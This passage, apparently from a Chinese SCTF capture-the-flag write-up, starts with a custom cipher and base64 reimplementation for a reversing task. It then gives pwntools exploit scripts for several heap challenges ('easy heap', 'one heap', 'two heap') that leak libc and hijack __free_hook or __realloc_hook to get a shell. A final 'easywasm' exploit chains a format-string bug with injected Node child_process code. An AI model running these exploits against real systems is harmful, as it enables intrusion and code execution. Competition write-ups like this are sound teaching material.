0xD7A1ECD7, 0x67CB3167, 0x95106395, 0xBA64D5BA, 0x48BF8748, 0x4627C246, 0x7A03F27A, 0x03DADB03, 0x700DFA70, 0xF8D55AF8, 0x7B92BB7B, 0x840B7784, 0x573CD657, 0x77416C77, 0x108A5D10, 0xD8A8E0D8, 0x4B655C4B, 0x523BD252, 0xD47B37D4, 0xEF1391EF, 0xA33A5BA3, 0x3B68A63B, 0xE18BD4E1, 0x39233439, 0x45FD1945, 0x24EBF724, 0xAAEE88AA, 0x0F090C0F, 0xBCB90ABC, 0xD5EA7ED5, 0x6411EA64, 0xC3BDFCC3, 0x59A49359, 0x1B151C1B, 0xDDAFE4DD, 0x2CAE6D2C, 0x9F1E6B9F, 0x12C1CF12, 0x01914901, 0x05070405, 0x3FFEEB3F, 0x72466872, 0xB6B702B6, 0x9E8F229E, 0x8A93328A, 0x257ABE25, 0x749BB774, 0x09D4D309, 0xE7560BE7, 0x4DB8834D, 0x88D8A088, 0x810C7381, 0x024B9202, 0xC72BB1C7, 0xECC94AEC, 0xF597C4F5, 0x90176790, 0x332D3C33, 0xDC3EADDC, 0x492ECE49, 0x1C598A1C, 0x5D32DE5D, 0xCCB4F0CC, 0x54E60D54, 0x158D5915, 0xC1F66EC1, 0x08459A08, 0x7CDE2D7C, 0x99C3B499, 0xCD25B9CD, 0xF10189F1, 0x1E12181E, 0xFA9EC8FA, 0x53AA9B53, 0x94812A94, 0x8949E989, 0x1F83511F, 0x8DDFA48D, 0xF2DB52F2, 0xB3B006B3, 0xDFE476DF, 0xC06727C0, 0xD630A5D6, 0x9852FD98, 0x13508613, 0xBBF59CBB, 0x2BE2FB2B, 0x22362822, 0x3E6FA23E, 0xE85F07E8, 0xE01A9DE0, 0x3461AA34, 0x9D55F99D, 0x111B1411, 0x3DB5793D, 0x78486078, 0x809D3A80, 0x4320C643, 0x195E8E19, 0xA63D5FA6, 0x00000000, 0xE6C742E6, 0x76D02576, 0x6F8EAB6F, 0xADA21EAD, 0x074C9607, 0x8F94368F, 0x35F0E335, 0xC6BAF8C6, 0x47B68B47, 0xDE753FDE, 0xAB7FC1AB, 0xD0ED7AD0, 0x0B9F410B, 0xD337A1D3, 0xE2510FE2, 0x4E62584E, 0x1DC8C31D, 0x4AF4154A, 0x446C5044, 0xC4F16AC4, 0x9A196F9A, 0x06DDDF06, 0xB2214FB2, 0xA476CDA4, 0x8B027B8B, 0xA7AC16A7, 0xB4FC90B4, 0xFE0885FE, 0xAFE98CAF, 0x69537469, 0xEB85DCEB, 0x73D72173, 0xB9BE0EB9, 0xCA692FCA, 0xA5E784A5, 0x9CC4B09C, 0x21ECF321, 0x23A76123, 0x0D429E0D, 0x7E95BF7E, 0x29A96929, 0x750AFE75, 0x6E1FE26E, 0x56AD9F56, 0x4C29CA4C, 0x8C4EED8C, 0xBEF298BE, 0x1A84551A, 0xFC4317FC, 0x4EED4E8C, 0x196F199A, 0xB883B84D, 0x7ABE7A25, 0x441344F9, 0x8BD48BE1, 0x7DBA7D20, 0xD1ACD187, 0x52FD5298, 0xE476E4DF, 0xDADBDA03, 0x5A785A66, 0xEF01EF5B, 0xA397A35C, 0xA51AA5A8, 0x068D06F4, 0x87A78760, 0x4B924B02, 0x07040705, 0xE372E3DA, 0x0F810FFB, 0xC1CFC112, 0xA969A929, 0x5BF15B97, 0x264B26B7, 0x459A4508, 0x812A8194, 0xEE88EEAA, 0x9436948F, 0xA6E8A6D2, 0x95BF957E, 0xF415F44A, 0x3F243F2D, 0xDC56DCF7, 0xF866F8CB, 0x9845980E, 0xC539C56D, 0x018901F1, 0xDFA4DF8D, 0xB006B0B3, 0x97C497F5, 0x0E080E0A, 0x8EAB8E6F, 0x6C506C44, 0x1FE21F6E, 0xC046C0E3, 0xECF3EC21, 0x6258624E, 0x55F9559D, 0x1E6B1E9F, 0xF0E3F035, 0xDE2DDE7C, 0xD929D979, 0x6FA26F3E, 0xA493A459, 0x7B377BD4, 0x32DE325D, 0x9D3A9D80, 0xF16AF1C4, 0x18E6186B, 0xB90AB9BC, 0x3D5F3DA6, 0x151C151B, 0x335733AC, 0xDB52DBF2, 0x0AFE0A75, 0x82D882EE, 0x1A9D1AE0, 0xF298F2BE, 0xAB12ABA2, 0xCFC7CF18, 0x89AF896A, 0xD3D7D30C, 0xD4D3D409, 0xFB94FBB1, 0x692F69CA, 0x027B028B, 0x74B6742F, 0xE784E7A5, 0xB702B7B6, 0x6E2B6ECF, 0x3CD63C57, 0x47E14783, 0x7FC17FAB, 0x00000000, 0x9BB79B74, 0x602360C5, 0xCB31CB67, 0x04F6047F, 0x61AA6134, 0xD025D076, 0xCC35CC62, 0x1218121E, 0x80A38065, 0x655C654B, 0x8F228F9E, 0xF59CF5BB, 0xC4B0C49C, 0x6DD96DB5, 0x510F51E2, 0x090C090F, 0xFC90FCB4, 0x76CD76A4, 0x11EA1164, 0xAD9FAD56, 0x91499101, 0x90C090F0, 0x9EC89EFA, 0x139113EF, 0xCAB8CA96, 0x36283622, 0x2CB52CC2, 0x71C971A1, 0x5D7C5D63, 0x429E420D, 0xE080E0A0, 0xE5FFE52E, 0x284328BD, 0x312C3127, 0xAC16ACA7, 0x723B72DB, 0xFF62FFCE, 0xB68BB647, 0x40E54086, 0xC94AC9EC, 0xD55AD5F8, 0x560B56E7, 0x4C964C07, 0x68A6683B, 0xCE4ECEE9, 0x5F075FE8, 0x7E487E5A, 0x8A5D8A10, 0xD721D773, 0x4D1F4DF6, 0x30A530D6, 0x25B925CD, 0xCDBCCD93, 0xE2FBE22B, 0xB18FB142, 0x8826889B, 0x2D3C2D33, 0x3EAD3EDC, 0x77447755, 0x73B2732A, 0x5E8E5E19, 0x5CF55C92, 0xBAF8BAC6, 0x53745369, 0x0DFA0D70, 0xEBF7EB24, 0xAA9BAA53, 0x1D991DE5, 0x672767C0, 0x964D9604, 0xBB71BB37, 0x8455841A, 0x78C578AE, 0x214F21B2, 0x6ADD6AB0, 0xD8A0D888, 0xB27DB238, 0xC6CBC617, 0x149514EA, 0x9CB39C71, 0x2BB12BC7, 0xA8E0A8D8, 0xBDFCBDC3, 0x0B770B84, 0x3A5B3AA3, 0xA761A723, 0x99CC99FF, 0x9A3E9A85, 0xA21EA2AD, 0x46684672, 0xFD19FD45, 0x580358ED, 0x8CD08CE4, 0x0C730C81, 0xFA1DFA40, 0x48604878, 0xEA7EEAD5, 0xE98CE9AF, 0x2430243C, 0xA1ECA1D7, 0x057F058E, 0xB4F0B4CC, 0xB3F4B3C9, 0x4F644F7D, 0x6B546B41, 0xE60DE654, 0xBF87BF48, 0x22BD22C8, 0xF311F34F, 0x9332938A, 0x49E94989, 0x416C4177, 0x50865013, 0x92BB927B, 0x088508FE, 0x23342339, 0x598A591C, 0xAFE4AFDD, 0x64D564BA, 0x1C101C14, 0xC3B4C399, 0xE109E151, 0x85DC85EB, 0x753F75DE, 0x7C337CD1, 0x17671790, 0xC742C7E6, 0x345334A9, 0xA065A026, 0x8D598D15, 0xE805E85E, 0xD25ED2FD, 0x66AE6631, 0x2A382A36, 0x4A1B4AF3, 0x8351831F, 0x35DA3558, 0x27C22746, 0xF66EF6C1, 0x20C62043, 0x431743FC, 0xAE6DAE2C, 0x9F419F0B, 0xB579B53D, 0x03F2037A, 0x63D163BF, 0xC8C3C81D, 0xED7AEDD0, 0xFEEBFE3F, 0xD6A8D682, 0x39A939D9, 0x16EE1661, 0x5470546C, 0x3BD23B52, 0x862E8691, 0x1B141B11, 0xBC75BC32, 0xC23DC268, 0xF7E7F730, 0x2F472FB8, 0x70407050, 0xBE0EBEB9, 0x794C795F, 0x38203828, 0x10631095, 0x37A137D3, 0x29CA294C, 0xF9EFF93A, 0xDDDFDD06, 0x2ECE2E49, 0x57825716, 0x7D417402, 0x7E721D1F, 0x8C219648, 0x49DCCA67, 0xA5705A22, 0x62D3DC8F, 0x69189C05, 0xBA7B287A, 0x946305E0, 0x4221C46A, 0xA5B54743, 0x83BE0F59, 0x0A12A2AA, 0x4C4C39E9, 0x8ECECDA6, 0x61F3F52C, 0x97E2077A, 0x2E99A95E, 0xEFE18498, 0x1CD31DA5, 0x456AA5B9, 0x36023F0B, 0xC4ED11CD, 0x02DAC41D, 0xE7CC1901, 0xED14F8A1, 0x94E9F986, 0x2BE2879F, 0x6565BA62, 0x2629D026, 0x8034B8CC, 0x212CD5F4, 0xCDD8BD39, 0x90042ED8, 0x3725D79C, 0x896C0C43, 0x7BE43031, 0xB3546C0D, 0xFD73D395, 0xC136D3B2]

overflow_byte = lambda x : x & 0xff overflow_word = lambda x : x & 0xffff overflow_dword = lambda x : x & 0xffffffff overflow_qword = lambda x : x & 0xffffffffffffffff HIBYTE = lambda x : (x >> 24) & 0xff BYTE1 = lambda x : (x >> 8) & 0xff BYTE2 = lambda x : (x >> 16) & 0xff BYTE = lambda x : x & 0xff WORD = lambda x : x & 0xffff

def ror4(data, bits): for i in range(bits): if data & 1: data >>= 1 data |= 0x80000000 else: data >>= 1 return overflow_dword(data)

def rol4(data, bits): for i in range(bits): if data & 0x80000000: data <<= 1 data |= 1 else: data <<= 1 return overflow_dword(data)

class Ex_Base64(object): """A new table for base64""" def init(self, new_table): super(Ex_Base64, self).init() self.old_table = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=") self.new_table = list(new_table) + ['=']

def Ex_base64_decode(self, cipher):
    new_cipher = ""
    for i in range(len(cipher)):
        tmp_index = self.new_table.index(cipher[i])
        new_cipher += self.old_table[tmp_index]
    return new_cipher.decode("base64")
def Ex_base64_encode(self, plain):
    new_cipher = ""
    tmp_cipher = plain.encode("base64").strip()
    for i in range(len(tmp_cipher)):
        tmp_index = self.old_table.index(tmp_cipher[i])
        new_cipher += self.new_table[tmp_index]
    return new_cipher
def encrypt_test(data, big_box=big_box): assert len(data) == 16 arr = [0] * 6 arr[0] = overflow_dword(struct.unpack('B', data[3])[0] << 24 | struct.unpack('B', data[2])[0] << 16 | struct.unpack('H', data[0:2])[0]) ^ big_box[1024] arr[1] = overflow_dword(struct.unpack('B', data[7])[0] << 24 | struct.unpack('B', data[6])[0] << 16 | struct.unpack('H', data[4:6])[0]) ^ big_box[1025] arr[2] = overflow_dword(struct.unpack('B', data[11])[0] << 24 | struct.unpack('B', data[10])[0] << 16 | struct.unpack('H', data[8:10])[0]) ^ big_box[1026] arr[3] = overflow_dword(struct.unpack('B', data[15])[0] << 24 | struct.unpack('B', data[14])[0] << 16 | struct.unpack('H', data[12:14])[0]) ^ big_box[1027] # print map(hex, arr) for i in range(16): if not i % 2: arr[4] = big_box[HIBYTE(arr[0])] ^ big_box[BYTE2(arr[0]) + 0x100] ^ big_box[BYTE1(arr[0]) + 0x200] ^ big_box[BYTE(arr[0]) + 0x300] arr[5] = big_box[HIBYTE(arr[1]) + 0x100] ^ big_box[BYTE2(arr[1]) + 0x200] ^ big_box[BYTE1(arr[1]) + 0x300] ^ big_box[BYTE(arr[1])] # print map(hex, arr) arr[2] = ror4(overflow_dword(arr[5] + arr[4] + big_box[1032 + i2]) ^ arr[2], 1) arr[3] = overflow_dword(arr[4] + arr[5] * 2 + big_box[1033 + i2]) ^ rol4(arr[3], 1) else: arr[4] = big_box[HIBYTE(arr[2])] ^ big_box[BYTE2(arr[2]) + 0x100] ^ big_box[BYTE1(arr[2]) + 0x200] ^ big_box[BYTE(arr[2]) + 0x300] arr[5] = big_box[HIBYTE(arr[3]) + 0x100] ^ big_box[BYTE2(arr[3]) + 0x200] ^ big_box[BYTE1(arr[3]) + 0x300] ^ big_box[BYTE(arr[3])] # print map(hex, arr) arr[0] = ror4(overflow_dword(arr[5] + arr[4] + big_box[1032 + i2]) ^ arr[0], 1) arr[1] = overflow_dword(arr[4] + arr[5] * 2 + big_box[1033 + i2]) ^ rol4(arr[1], 1) # print "%d: "%(i) + str(map(hex, arr)) # print map(hex, arr) arr[2] ^= big_box[1028] arr[3] ^= big_box[1029] arr[0] ^= big_box[1030] arr[1] ^= big_box[1031] # print map(hex, arr) return chr(BYTE(arr[2])) + struct.pack('H', WORD(arr[2] >> 8)) + chr(HIBYTE(arr[2])) + struct.pack('I', arr[3]) + struct.pack('I', arr[0]) + struct.pack('H', WORD(arr[1])) + chr(BYTE2(arr[1])) + chr(HIBYTE(arr[1]))

def encrypt_ojbk(data): assert len(data) == 32 check_in = lambda x: x in "abcdef0123456789" for i in xrange(len(data)): if not check_in(data[i]): os.exit(0)

first_list = [0] * 16
for i in xrange(0, len(data), 2):
    tmp_index = int(data[i], 16)
    tmp_var = int(data[i + 1], 16)
    if first_list[tmp_index]:
        print "input error"
        os.exit(1)
    else:
        first_list[tmp_index] = tmp_var
j = 0
flag1 = 0
flag2 = 0
second_list = [0] * 24
for x in xrange(24):
    if x % 6 == 0:
        second_list[x] = first_list[((-1 % 16) + flag1 * 4) % 16]
        flag1 += 1
    elif x % 6 == 5:
        second_list[x] = first_list[((4 % 16) + flag2 * 4) % 16]
        flag2 += 1
    else:
        second_list[x] = first_list[j]
        j += 1
concat_byte = lambda x, y: x << 4 | y
third_bytes = ''
for x in xrange(0, len(second_list), 2):
    third_bytes += chr(concat_byte(second_list[x], second_list[x + 1]))
tmp_s = "".join([chr(i) for i in range(150,214)])
exbase = Ex_Base64(tmp_s)
fourth_bytes = exbase.Ex_base64_encode(third_bytes)
return encrypt_test(fourth_bytes)
if name == 'main': 
    print encrypt_ojbk("afb1c2d3e4f5061728394a5b6c7d8e9f") == "".join(map(chr, [0xea, 0x6f, 0x69, 0xba, 0x79, 0xe3, 0xa9, 0x01, 0x4e, 0x2d, 0xf8, 0xc2, 0xb3, 0x2e, 0x29, 0x0a]))
```

## PWN
### easy heap
```
from pwn import *
context(arch = 'amd64',os='linux')
def add(size):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('Size')
    p.sendline(str(size))
    p.recvuntil('0x')
    return p.recv(12)

def dele(idx):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil('Index')
    p.sendline(str(idx))

def edit(idx,cont):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil('Index')
    p.sendline(str(idx))
    p.recvuntil('Content')
    p.send(cont)
libc = ELF('./libc.so.6')
#p = process('./easy_heap',env={'LD_PRELOAD':'./libc-2.23.so'})
p = remote('132.232.100.67', 10004)
p.recvuntil('0x')
mmap_addr = int(p.recvuntil('\n')[:-1],16)
print hex(mmap_addr)
ptr_addr = int(add(0x100-8),16)#0
info("ptr:0x%x",ptr_addr)
add(0xf8)#1
add(0xf8)#2
edit(0,p64(0)+p64(0xf1)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)+(0x100-8-16-8-16)*'\x00'+p64(0xf0))
dele(1)
#edit(0,p64(0)+p64(0)+p64(0x200)+p64(ptr_addr-8)+p64(0x90)+p64(ptr_addr+0x30-8)+p64(0)+p64(0x91)+'\x00'*0x80+p64(0x90)+p64(0x91)+'\n')

add(0x80)#1
add(0x80)#3
add(0x80)#4
dele(1)
dele(4)
edit(0,p64(0)+p64(0)+p64(0x200)+p64(ptr_addr-8+0x50)+p64(0x200)+p64(mmap_addr)+p64(0)*2+p64(0x80)+'\x28\n')
edit(3,p64(ptr_addr+0x40)+'\n')
add(128)
a = 0x16# int(raw_input("a"),16)
edit(0,p64(0x200)+'\x20'+chr(a)+'\n')
edit(5,p64(0xfbad3c80)+p64(0)*3+p8(0)+'\n')
p.recvuntil(p64(0)*3)
addr = u64(p.recv(8))
libc_base = addr - (0x7f7af9dfa6e0-0x7f7af9a37000)
print hex(libc_base)
free_hook = libc_base+libc.symbols['__free_hook']
sh = asm(shellcraft.sh())
edit(1,sh+'\n')
edit(0,p64(0x200)+p64(free_hook)+'\n')
edit(5,p64(mmap_addr)+'\n')
p.sendline('2')
p.sendline('0')
p.interactive()
```
### one heap
用hbase爆破pbase的1/8192变态house of Roman + 1/1的house of three
```
from pwn import *
context.arch = "amd64"
context.aslr = False
libc = ELF("./libc-2.27.so")

def add(size,data,shift = False):
    io.sendlineafter("choice:",str(1))
    io.sendlineafter("size",str(size))
    if(shift == False):
        io.sendlineafter("content:",data)
    else:
        io.sendafter("content:",data)
def rm():
    io.sendlineafter("choice:",str(2))
while(True):
    try:
        #io = process("./one_heap",env = {"LD_PRELOAD":"./libc-2.27.so"})
        io = remote('47.104.89.129',10001)
        add(0x60,'0000')
        rm()
        rm()
        add(0x60,'\x20\x60\x64')
        add(0x60,' ')
        add(0x60,'\n',shift = True)
        add(0x60,p64(0xfbad1880)+p64(0)*3+"\x58")
        lbase = u64(io.recv(6).ljust(8,'\x00'))-libc.sym['_IO_file_jumps']
        success("LBASE -> %#x"%lbase)
        add(0x40,'0000')
        rm()
        rm()
        add(0x40,p64(lbase+libc.sym['__realloc_hook']))
        add(0x40,p64(lbase+libc.sym['__realloc_hook']))
        one = 0x4f2c5
        add(0x40,p64(lbase+one)+p64(lbase+libc.sym['realloc']+0xe))
        add(0x30,"cat flag\x00")
        #gdb.attach(io,'handle SIGALRM nostop noprint')
        io.interactive()
        raw_input()
    except Exception,e:
        info(str(Exception)+str(e))
        io.close()
```
### two heap
0x1 0x8 0x10 0x18绕size check(都是生成0x20的堆块)
```
from pwn import *
context.arch = 'amd64'
#context.aslr = False
libc = ELF("./libc-2.26.so")

def add(size,data):
    io.sendlineafter("choice:","1")
    io.sendlineafter("size:\n",str(size))
    io.sendafter("note:\n",data)
def rm(idx):
    io.sendlineafter("choice:","2")
    io.sendlineafter("index:\n",str(idx))
while(True):
    try:
        io = remote('47.104.89.129',10002)
        #io = process("./two_heap",env = {"LD_PRELOAD":"./libc-2.26.so"})
        io.sendlineafter("SCTF:\n","%a%a%a%a%a")
        io.recvuntil("0x0.0")
        lbase = (int(io.recv(11),16)<<4)-libc.sym['_IO_2_1_stdout_']
        info("LBASE -> %#x"%lbase)
        add(1,'')
        rm(0);rm(0);ls
        add(8,p64(lbase+libc.sym['__free_hook']))
        add(0x10,'\n')
        add(24,p64(lbase+libc.sym['system'])+'\n')
        add(40,"/bin/sh\x00"+"\n")
        io.sendline("2")
        io.sendline("4")
        #gdb.attach(io,'handle SIGALRM nostop noprint')
        io.interactive()
        raw_input()
    except Exception,e:
        info(str(e))
        io.close()
```

### easywasm
>出题人：0xd5f
解题人数：0
最终分数：1000

程序存在一个结构体用于保存信息记录

`C struct { char *username; int password; char *introduction; void (*state)(const char *); } record;`

先说三个函数逻辑

`registered()`用于初始化record结构体

`profile()`用于打印username和introduction

`login()`用于验证username和password并通过state函数指针返回登录成功或失败的状态信息

因为程序存在`Z_envZ__emen_run_Z_vi`,只需要改变state即可,但是如果成功调用,还需要泄露出password

其中`profile()`存在一个溢出漏洞和一个格式化字符串漏洞,通过溢出,我们可以控制任意写的地址,然后再leak出password即可,许多payload的细节可以调试知道

不过带师傅们好像更热衷于ddos,Orz

exp

```
import requests

url = 'http://47.104.89.129:23333/'

registered = url + 'registered' profile = url + 'profile' login = url + 'login'

username = 'username' password = 'password' introduction = 'introduction'

payload = '' payload += 'A'*7 payload += ''' const exec=require("child_process").exec; exec("cat flag", function(error,stdout,stderr){process.stdout.write(stdout);}); '''.ljust(0x7f, ' ') payload += '//\x3C\x0D\x00'

params = { username: '%2$0141d%1$n', introduction: payload } requests.get(registered, params=params) req = requests.get(profile) passwd = req.text.lstrip('Welcome, ').rstrip('Your introduction: AAAAAAA')

params = { username: '%2$0141d%1$n', password: passwd } requests.get(login, params=params)

```

# 评论区
**请文明评论，禁止广告**
<img src="https://ctfwp.wetolink.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  

---
